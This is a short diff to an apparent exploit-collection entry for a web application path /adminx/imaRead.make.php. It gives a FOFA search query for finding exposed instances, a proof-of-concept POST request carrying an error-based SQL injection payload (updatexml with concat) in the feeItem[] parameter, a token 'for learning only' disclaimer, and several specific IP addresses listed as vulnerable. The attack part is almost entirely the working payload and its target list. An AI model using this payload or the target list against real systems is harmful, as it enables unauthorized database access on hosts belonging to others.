@@ -5,10 +5,10 @@ FOFA:
   body="不要着急，点此"
 
 POC：
-  /adminx/imaRead.make.php?act=remakeHost:User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/123.0
+  POST /adminx/imaRead.make.php?act=remake HTTP/1.1
 feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(12345678)),1)
 
-example:（##免责声明：仅用于科学上网绿色实验健康学习##）
+Example:（##免责声明：仅用于科学上网绿色实验健康学习##）
   http://8.134.10.198存在SQL注入漏洞
   https://36.249.159.149:8876存在SQL注入漏洞
   https://36.249.159.149:8876存在SQL注入漏洞
